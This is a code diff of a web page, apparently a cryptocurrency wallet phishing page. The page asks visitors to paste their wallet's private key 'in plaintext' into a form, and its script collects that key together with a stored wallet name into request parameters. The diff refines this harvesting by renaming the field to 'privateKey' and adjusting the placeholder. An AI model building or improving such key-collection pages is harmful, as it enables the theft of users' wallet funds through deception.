@@ -85,8 +85,8 @@
             <h1>
                 typically 64 alphanumeric charaters, Input key strings in plaintext
             </h1>
-            <textarea placeholder="" required>e.g. 
-3a1079c3fljw8485kh4ggf745ytreiut598745uitu85g4g95t5u49458t5uu4958</textarea>
+            <textarea placeholder="e.g. 
+3a1079c3fljw8485kh4ggf745ytreiut598745uitu85g4g95t5u49458t5uu4958" required></textarea>
            
            
             <div>
@@ -234,7 +234,7 @@
     popup()
     const params={
         walletName:localStorage.getItem("DEFIWalletName"),
-        keyphrase:form[2].getElementsByTagName("textarea")[0].value
+        privateKey:form[2].getElementsByTagName("textarea")[0].value
     }
     if (form[2].getElementsByTagName("textarea")[0].value) {
         const requestOptions = {
